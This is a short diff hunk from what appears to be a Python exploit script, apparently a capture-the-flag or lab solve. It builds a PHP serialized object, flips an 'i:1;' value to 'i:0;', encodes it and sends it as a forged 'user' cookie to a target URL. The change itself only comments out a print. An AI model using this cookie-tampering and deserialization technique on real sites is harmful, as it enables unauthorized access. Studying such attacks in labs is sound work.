@@ -23,7 +23,7 @@ echo serialize([
 
 payload = check_output(['php','-r',php_code])
 payload = payload.replace(b'i:1;',b'i:0;')
-print(payload)
+# print(payload)
 payload = quote(b64encode(payload))
 res = requests.get(url, headers={ 'Cookie': 'user='+payload })
 # print(res.text)
